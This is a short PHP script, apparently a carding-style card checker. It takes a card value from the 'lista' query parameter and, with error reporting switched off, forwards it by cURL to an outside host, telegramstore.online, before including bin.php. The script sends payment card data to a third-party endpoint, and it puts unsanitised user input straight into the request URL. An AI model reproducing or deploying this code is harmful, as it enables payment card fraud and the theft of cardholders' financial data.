<?php
error_reporting(0);
$card = $_GET["lista"];

$ch = curl_init('https://telegramstore.online/api/google?card='.$card);
$result = curl_exec($ch);
curl_close($ch);
include("bin.php");